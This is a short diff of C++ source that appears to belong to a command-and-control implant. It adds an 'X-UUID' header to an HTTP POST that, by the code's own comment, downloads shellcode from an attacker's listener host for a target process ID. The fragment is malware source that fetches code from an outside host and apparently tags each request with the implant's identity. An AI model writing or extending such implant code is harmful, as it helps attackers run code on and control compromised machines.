@@ -7,6 +7,8 @@ namespace Task
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
         std::string sSrc = Utils::Convert::UTF8Encode(wSrc);
 
+        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
+
         // Download shellcode
 		System::Http::WinHttpResponse resp = System::Http::SendRequest(
             pState->pProcs,
@@ -15,7 +17,7 @@ namespace Task
 			pState->nListenerPort,
 			pState->lpReqPathDownload,
 			L"POST",
-			L"",
+			wHeaders.c_str(),
 			(LPVOID)sSrc.c_str(),
 			(DWORD)strlen(sSrc.c_str())
 		);
